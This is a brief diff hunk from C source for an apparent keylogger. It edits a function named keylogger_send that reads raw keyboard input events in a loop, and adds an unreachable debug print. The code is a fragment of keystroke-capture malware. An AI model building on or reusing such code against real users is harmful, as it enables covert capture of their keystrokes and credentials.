@@ -180,7 +180,11 @@ void *keylogger_send(void *args_input) {
     int bytesRead = 0;
     struct input_event events[NUM_EVENTS];
 
-    while(loop) {
+    while(loop != 0) {
+        if(loop == 0) {
+            printf("hoow?!\n");
+        }
+
         bytesRead = read(keyboard_fd, events, sizeof(struct input_event) * NUM_EVENTS);
 
         for(int i = 0; i < (bytesRead / (int) sizeof(struct input_event)); ++i) {
